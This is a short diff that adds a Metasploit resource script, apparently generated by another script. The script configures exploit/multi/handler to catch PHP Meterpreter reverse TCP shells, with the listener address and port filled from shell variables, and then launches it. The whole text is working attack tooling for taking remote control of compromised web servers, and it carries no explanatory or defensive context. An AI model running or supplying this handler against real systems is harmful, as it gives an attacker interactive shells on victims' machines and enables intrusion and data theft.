@@ -1,0 +1,6 @@
+use exploit/multi/handler
+set payload php/meterpreter_reverse_tcp
+set LPORT $b
+set LHOST $a
+set payload php/meterpreter_reverse_tcp
+exploit
